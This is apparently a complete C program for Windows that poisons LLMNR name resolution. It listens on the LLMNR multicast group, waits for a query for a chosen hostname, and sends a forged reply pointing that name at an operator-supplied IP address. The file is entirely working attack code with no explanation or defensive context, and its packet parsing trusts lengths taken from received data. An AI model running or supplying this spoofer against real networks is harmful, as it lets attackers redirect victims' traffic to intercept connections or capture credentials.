#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>
#include <stdint.h>
#include <ws2tcpip.h>

#pragma comment(lib, "ws2_32.lib") // Link with ws2_32.lib

#define PORT 5355
#define BUF_SIZE 1024
// Define constants for IPv4 and IPv6
#define IPV4_TYPE 1
#define IPV6_TYPE 2
#define UNKNOWN_TYPE 0
#define MADDR "224.0.0.252"

#define MAX_NAME_LEN 256  // Define a max length for QuestionName and AnswerName


// Function to determine IP type
int determine_ip_type(char* ipType) {
	char ipV6_sign[] = {0x00, 0x1c, 0x00, 0x01};
	char ipV4_sign[] = {0x00, 0x01, 0x00, 0x01};

    if (memcmp(ipType, ipV6_sign, 4) == 0) {
        return IPV6_TYPE;
    }
    if (memcmp(ipType, ipV4_sign, 4) == 0) {
        return IPV4_TYPE;
    }
    return UNKNOWN_TYPE; // If neither matches
}


int main(int argc, char **argv) {
	if(argc < 3)
	{
		printf("Wrong number of arguments.\n");
		printf("%s <Name> <IP to specify in LLMNR response>\n", argv[0]);
		return 1;
	}

    WSADATA wsaData;
    SOCKET sock;
    struct sockaddr_in serverAddr, clientAddr;
	struct ip_mreq mreq;
    int addrLen = sizeof(clientAddr);
	int nameLen, recvLen;
	unsigned char reqName[BUF_SIZE];
	unsigned char ipType[4];
    unsigned char buffer[BUF_SIZE];
    unsigned char name[MAX_NAME_LEN];
	unsigned char ip[4];
	unsigned char tid[2];

	if (strlen(argv[1]) > MAX_NAME_LEN)
	{
		printf("Error: Name is longer than the limit (256)");
		return 1;
	}
	memset(name, 0, MAX_NAME_LEN);
	memcpy(name, argv[1], strlen(argv[1]));
	sscanf(argv[2], "%hhu.%hhu.%hhu.%hhu", &ip[0], &ip[1], &ip[2], &ip[3]);

	unsigned char r1[] = {
		0xff, 0xff, // Tid
		0x80, 0x00, // Flags
		0x00, 0x01, // Question
		0x00, 0x01, // AnswerRRS
		0x00, 0x00, // AuthorityRRS
		0x00, 0x00, // AdditionalRRS
		0xff // QuestionNameLen
	};
	unsigned char QuestionName[MAX_NAME_LEN];
	unsigned char r2[] = {
		0x00, // QuestionNameNull
		0x00, 0xff, // Type
		0x00, 0x01, // Class
		0xff // AnswerNameLen
	};
	unsigned char AnswerName[MAX_NAME_LEN];
	unsigned char r3[] = {
		0x00, // AnswerNameNull
		0x00, 0xff, // Type1
		0x00, 0x01, // Class1
		0x00, 0x00, 0x00, 0x1e, // TTL
		0x00, 0x04, // IPLen
		0xff, 0xff, 0xff, 0xff // IP
	};
	
    // Initialize Winsock
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
		printf("WSAStartup failed: %d\n", WSAGetLastError());
        return 1;
    }
	
    // Create a UDP socket
    if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) == INVALID_SOCKET) {
		printf("Socket creation failed: %d\n", WSAGetLastError());
        WSACleanup();
        return 1;
    }
	// Set socket option
    int opt = 1;
    if (setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, (const char*)&opt, sizeof(opt)) < 0) {
        perror("setsockopt failed");
        closesocket(sock);
        WSACleanup();
        return 1;
    }

    // Prepare the sockaddr_in structure
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_addr.s_addr = htonl(INADDR_ANY); // Listen on any incoming address
    serverAddr.sin_port = htons(PORT); // Use the specified port
	
    // Bind the socket
    if (bind(sock, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
		printf("Bind failed: %d\n", WSAGetLastError());
        closesocket(sock);
        WSACleanup();
        return 1;
    }

	// Join the multicast group
    mreq.imr_multiaddr.s_addr = inet_addr(MADDR);
    mreq.imr_interface.s_addr = INADDR_ANY;
    if (setsockopt(sock, IPPROTO_IP, IP_ADD_MEMBERSHIP, (char*)&mreq, sizeof(mreq)) < 0) {
        perror("setsockopt IP_ADD_MEMBERSHIP failed");
        closesocket(sock);
        WSACleanup();
        return 1;
    }
    while(1)
	{
		memset(QuestionName, 0, MAX_NAME_LEN);
		// Receive a message from the client
		recvLen = recvfrom(sock, buffer, BUF_SIZE, 0, (struct sockaddr*)&clientAddr, &addrLen);
		if (recvLen == SOCKET_ERROR) {
			printf("recvfrom failed: %d\n", WSAGetLastError());
			return 1;
		}
		
		nameLen = buffer[12];
		memcpy(QuestionName, buffer + 13, nameLen);
		if(strcmp(QuestionName, name) == 0)
		{
			break;
		}
    }
	memcpy(ipType, buffer + recvLen - 4, 4);
	memcpy(tid, buffer, 2);
	
	switch(determine_ip_type(ipType))
	{
		case IPV6_TYPE:
		r2[2] = 0x1c; // set Type
		r3[2] = 0x1c; // set Type1
		break;
		case IPV4_TYPE:
		r2[2] = 0x01; // set Type
		r3[2] = 0x01; // set Type1
		break;
		default:
		break;
	}

	memcpy(r1, tid, 2); // set TID
	r1[12] = nameLen; // set QuestionNameLen
	r2[5] = nameLen; // set AnswerNameLen
	memcpy(AnswerName, buffer + 13, nameLen); // set AnswerName
	memcpy(r3 + 11, ip, 4); // set IP

	// Assemble response
	unsigned char result[sizeof(r1)+nameLen+sizeof(r2)+nameLen+sizeof(r3)];
	memcpy(result, r1, sizeof(r1));
	memcpy(result+sizeof(r1), QuestionName, nameLen);
	memcpy(result+sizeof(r1)+nameLen, r2, sizeof(r2));
	memcpy(result+sizeof(r1)+nameLen+sizeof(r2), AnswerName, nameLen);
	memcpy(result+sizeof(r1)+nameLen+sizeof(r2)+nameLen, r3, sizeof(r3));

	// Send a response back to the client
	sendto(sock, (void *)&result, sizeof(result), 0, (struct sockaddr*)&clientAddr, addrLen);

	printf("Sent response for %s\n", QuestionName);
	
    // Clean up
    closesocket(sock);
    WSACleanup();
	
    return 0;
}
